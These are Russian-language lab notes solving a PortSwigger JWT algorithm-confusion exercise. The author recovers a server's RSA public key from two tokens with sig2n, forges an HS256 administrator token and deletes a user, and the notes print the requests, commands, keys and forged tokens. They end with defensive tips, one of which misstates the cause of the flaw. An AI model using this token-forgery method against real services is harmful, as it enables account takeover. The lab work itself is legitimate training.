#### Вывод открытых ключей из существующих токенов
#### ПУТАНИЦА АЛГОРИТМОВ
#### КОГДА ПУБЛИЧНЫЙ КЛЮЧ НЕИЗВЕСТЕН
-------

## СМЫСЛ 
ключ НЕ ДОСТУПЕН через эндпоинты
Сервер его не отдает
Но уязвимость та же — алгоритм можно путать. 
И фиг с ним, что ключ скрыт — его можно **ВЫЧИСЛИТЬ МАТЕМАТИЧЕСКИ** из двух разных JWT, которые выдает сервер

логинимся два раза, получаем два валидных токена, 
скармливаем их специальной тулзе (sig2n в докере), 
а она методом математической магии восстанавливает публичный ключ сервера
дальше всё как в  лабе [[07_JWT_Algorithm_Confusion+publicKey]] 
только там я нашел публичный ключ в /jwks.json
а здесь этот ключ можно сгенерировать путем двух jwt секретов
и этот ключ использую дельше как секрет для HS256, подписываем jwt этим токеном -  но с нужными пейлоадами


---
лаба https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key

задание: попасть в ак администратора и удалить карлоса

+ в лабе подсказка You can assume that the server stores its public key as an X.509 PEM file.
-----

##### шаг 1
выполняю два входа в аккаунт - надеясь получить два разных jwt ключа

первый вход
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4e00c303ef39b48082542400ab0009.web-security-academy.net
Cookie: session=eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjY0NjU3MSwic3ViIjoid2llbmVyIn0.wwQBXVEqGWoKSqjdRrbEGyKlWpMWeIyrExnWUYXGdGZaYZlbgtNGhq1Gp4up7iwfLYckSmxMbbTyh7y_lTQ_w0BOXHu9sUPTaREV54nbaT_Znm4TKmyb2avlTB79oi0-prFzum7k5TlUNpVqSaVLtCj5axgjmUJwL8C4vNgU-9tUDxunsFTlpO-4l9qnjIRwldknJk6hN5eROtv7WSzvqcGOXQeZs6WaIpIOkP8V6Ig3GweTacCkdx98pa23LgshDPofwneQzwatUFVWxNrHOxSH03Ax6m2ecUdBmdD2fXspz_WGCPlvo_1KwKoeCMvQe5o_0EYeMGjHEF70zOxACw
Cache-Control: max-age=0
```


второй вход 
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4e00c303ef39b48082542400ab0009.web-security-academy.net
Cookie: session=eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjY0NjczMCwic3ViIjoid2llbmVyIn0.B5LUzCyziB0X12pnnEqfsUnm0upy4WvLNSn7K2-KnbQtSGBsKolw5llILsASHt61EH69DSIIXX2RJQ3eKcLrDQ__EwHQFJTOF8-8j4hlwWVt2XEofKrOQr1dkWs9zpBv8tlQpvxqmpGWmlj18kNRlik6rPHkzMaR3k701_PMYKlAwU7fyiqEVn4YlqR3Y3hlP3h9LcR1EG4hhilEaE8CHiKlldyFNqBQeTf-L90LCGG8wDTRuj1gqAdWjHrzFOU1yiAqjh4JCQ5UME_xWFKbA1sYa_G8wSkBchWk5BB_-xIDr6__X78YWiFHtOJj4Q4wXPRhE8vLzhwhPJiBZ5lY2g
Cache-Control: max-age=0
```
-------

видно - что оба ключа отличаются!
отлично - теперь нужно используя их - вычислить паблик кей!

------

от платформы есть прога rsa_sign2n https://github.com/silentsignal/rsa_sign2n

клонирую ее себе  https://github.com/silentsignal/rsa_sign2n.git


есть готовая команда от портсвигер
```
docker run --rm -it portswigger/sig2n <токен1> <токен2>
```

```

docker run --rm -it portswigger/sig2n eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjY0NjczMCwic3ViIjoid2llbmVyIn0.B5LUzCyziB0X12pnnEqfsUnm0upy4WvLNSn7K2-KnbQtSGBsKolw5llILsASHt61EH69DSIIXX2RJQ3eKcLrDQ__EwHQFJTOF8-8j4hlwWVt2XEofKrOQr1dkWs9zpBv8tlQpvxqmpGWmlj18kNRlik6rPHkzMaR3k701_PMYKlAwU7fyiqEVn4YlqR3Y3hlP3h9LcR1EG4hhilEaE8CHiKlldyFNqBQeTf-L90LCGG8wDTRuj1gqAdWjHrzFOU1yiAqjh4JCQ5UME_xWFKbA1sYa_G8wSkBchWk5BB_-xIDr6__X78YWiFHtOJj4Q4wXPRhE8vLzhwhPJiBZ5lY2g eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjY0NjU3MSwic3ViIjoid2llbmVyIn0.wwQBXVEqGWoKSqjdRrbEGyKlWpMWeIyrExnWUYXGdGZaYZlbgtNGhq1Gp4up7iwfLYckSmxMbbTyh7y_lTQ_w0BOXHu9sUPTaREV54nbaT_Znm4TKmyb2avlTB79oi0-prFzum7k5TlUNpVqSaVLtCj5axgjmUJwL8C4vNgU-9tUDxunsFTlpO-4l9qnjIRwldknJk6hN5eROtv7WSzvqcGOXQeZs6WaIpIOkP8V6Ig3GweTacCkdx98pa23LgshDPofwneQzwatUFVWxNrHOxSH03Ax6m2ecUdBmdD2fXspz_WGCPlvo_1KwKoeCMvQe5o_0EYeMGjHEF70zOxACw
```


результаты запуска:

```c

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4cGxlUVBzZFpZcWt3aDdqMC91OQpRSFM0Q3gzY1hSZ2NBQ1orYUhJOURUbngzZTVnSW5hMEZUc09NVnNMem8reXpudUZhd0tlTEM5dWFxSEhWYUJnCktPNVV1U3I1djRKRGswdFJUdmdZeU9zcXVRS2E1WHJkUllZU2JIRldtZTJ1K0F6NzlOZnp6TWMzMFJHSjFrRlgKTi9qUUFVakUzOWhqVTE5TDZkOFdBbE5zTE1ycXcyV2FxOUgxbEpzc0dOcTFZcjN4cUJ5d2p1YVl5aFpjWnhPWAppb0xYQWk4NUt3TzhReHpBSitoN3dhRzAwN2hsM2F5TnVrOEpwd014bWowOVIxYkRvb0NMSHNTOVZPUEtheFo2Cmg5YlpBSGpOM1BRK29IdzZOSXIxekYzN0ZONmNmTjh4RWZvejZCbko3RU1zYkV6RThjY3AzOFFuTDZMMnpmcmsKZFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc3MjcyOTY0NCwgInN1YiI6ICJ3aWVuZXIifQ.6f5wAOyV1Zc08DlArIqyFzZJ9p7QzedPcU6c4DdFfhw
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXhwbGVRUHNkWllxa3doN2owL3U5UUhTNEN4M2NYUmdjQUNaK2FISTlEVG54M2U1Z0luYTAKRlRzT01Wc0x6byt5em51RmF3S2VMQzl1YXFISFZhQmdLTzVVdVNyNXY0SkRrMHRSVHZnWXlPc3F1UUthNVhyZApSWVlTYkhGV21lMnUrQXo3OU5menpNYzMwUkdKMWtGWE4valFBVWpFMzloalUxOUw2ZDhXQWxOc0xNcnF3MldhCnE5SDFsSnNzR05xMVlyM3hxQnl3anVhWXloWmNaeE9YaW9MWEFpODVLd084UXh6QUoraDd3YUcwMDdobDNheU4KdWs4SnB3TXhtajA5UjFiRG9vQ0xIc1M5Vk9QS2F4WjZoOWJaQUhqTjNQUStvSHc2TklyMXpGMzdGTjZjZk44eApFZm96NkJuSjdFTXNiRXpFOGNjcDM4UW5MNkwyemZya2RRSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc3MjcyOTY0NCwgInN1YiI6ICJ3aWVuZXIifQ.m60rwmokXklR0qEAEzHEec1NN-z18fXJj3e6QZ9LGs0
```

теперь нужно по очереди подставлять эти ключи в куку 
```
GET /my-account?id=wiener HTTP/2
Host: 0a2b0057039fe09581c816bd00190096.web-security-academy.net
Cookie: session=вот сюда!
```


и вуаля - вот этот код сработал!
и с ним получилось также попасть в аккаунт - как и с оригинальным jwt
nеперь у меня  есть правильный X.509 ключ в base64 (тот, который соответствует этому токену)
```c
eyJraWQiOiI4ZmU1ODhkNC1lMjk3LTRiNTgtYjM4My02MzdhZjRmY2ZiMGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc3MjcyOTY0NCwgInN1YiI6ICJ3aWVuZXIifQ.6f5wAOyV1Zc08DlArIqyFzZJ9p7QzedPcU6c4DdFfhw
```

теперь нужно просто с его помощью создать симметричный ключ
и потом им подписать измененный jwt 

создаю симметричный ключ 
иду в JWT editor

создал вот такой симметрич ключ 
в качестве k параметра использовал этот x509 ключ 
он самый первый в выдачи программы  rsa_sign2n
```c
{  
    "kty": "oct",  
    "kid": "7119b71d-2fe7-47c2-863b-bb1703b8acce",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4cGxlUVBzZFpZcWt3aDdqMC91OQpRSFM0Q3gzY1hSZ2NBQ1orYUhJOURUbngzZTVnSW5hMEZUc09NVnNMem8reXpudUZhd0tlTEM5dWFxSEhWYUJnCktPNVV1U3I1djRKRGswdFJUdmdZeU9zcXVRS2E1WHJkUllZU2JIRldtZTJ1K0F6NzlOZnp6TWMzMFJHSjFrRlgKTi9qUUFVakUzOWhqVTE5TDZkOFdBbE5zTE1ycXcyV2FxOUgxbEpzc0dOcTFZcjN4cUJ5d2p1YVl5aFpjWnhPWAppb0xYQWk4NUt3TzhReHpBSitoN3dhRzAwN2hsM2F5TnVrOEpwd014bWowOVIxYkRvb0NMSHNTOVZPUEtheFo2Cmg5YlpBSGpOM1BRK29IdzZOSXIxekYzN0ZONmNmTjh4RWZvejZCbko3RU1zYkV6RThjY3AzOFFuTDZMMnpmcmsKZFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="  
}
```

<img src="../../assets/2026-03-0422.00.07.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



поменял на администратор + alg = HS256
и подписал
и сам запрос поменял на GET /my-account?id=administrator HTTP/2

<img src="../../assets/С2026-03-0422.00.49.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



и победа - попал в админку!!!

<img src="../../assets/С2026-03-0422.01.52.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



теперь нахожу путь в саму админ панель:
```html
</p>
                            <a href="/admin">Admin panel</a><p>
```

и потом нахожу путь к удалению карлоса

```html
iv>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

## и все! лаба решена!!!

---


####  чём смысл уязвимости в 

уязвимость та же, что и в классической путанице алгоритмов - сервер использует RS256, но библиотека доверяет параметру `alg` в заголовке JWT

и если подменить `alg` на `HS256`, библиотека начнёт интерпретировать публичный ключ как секретный (HMAC)

но если ключ не лежит в открытом доступе (нет `/jwks.json`), его оказалось восстановить математически (фантастика просто)

#### как работает восстановление ключа

RSA-подпись под двумя разными JWT позволяет вычислить модуль `n` публичного ключа

инструмент `rsa_sign2n` (или готовый докер-образ `portswigger/sig2n`) делает это автоматически, перебирая возможные множители и выдавая несколько кандидатов
(короче - как-то но делает это)

#### как удалось решить лабу :

собрал два валидных JWT
Просто залогинился два раза подряд одним и тем же акком, сохранил оба токена из кук
   
потом запустил восстановление ключа 
использовал готовую команду:
   
 `  docker run --rm -it portswigger/sig2n <токен1> <токен2>`
   
   инструмент выдал два кандидата (X.509 и PKCS1) и по одному тестовому JWT для каждого - что очень круто  и удобно
   
определил правильный ключ   вот так:
я подставил первый тестовый JWT в куку запроса на `/my-account` = ответ 200  значит, этот ключ верный

второй кандидат (pkcs1) упал с 302 редиректом

след шаг:

создал симметрич  ключ в JWT editor для атаки 
cкопировал `Base64 encoded x509 key`, соответствующий правильному токену
в JWT Editor создал новый симметричный ключ и вставил эту base64-строку в поле `"k"`

далее все как обычно и по порядку:

 в repeater изменил `alg` на `HS256`, `sub` на `administrator` и подписал новым симметрич ключом

ну и попал в админку - потом удалил карлоса ! the end!



## как защититься от таких атак :: (ответ гпт)

1. **Фиксируйте алгоритм в коде.** Никогда не берите алгоритм из заголовка токена. В функции проверки жестко прописывайте `RS256` или другой ожидаемый алгоритм.,
2. нельзя допустить - что сервер доверял напрямую тому - че там написано в alg и в kid
    
3. **Разделяйте логику для разных типов ключей.** Не используйте одну функцию `verify()` и для асимметричных, и для симметричных алгоритмов.
    
4. **Валидируйте заголовок.** Проверяйте не только `alg`, но и другие параметры (`kid` должен соответствовать известному ключу).
    
5. **Используйте актуальные библиотеки.** В современных версиях многих библиотек эта проблема уже исправлена на уровне кода.
    
6. **Следите за утечками ключей.** Если злоумышленник может математически восстановить ключ по двум токенам, значит, алгоритм RS256 реализован с уязвимостью. Используйте стандартные, проверенные реализации.
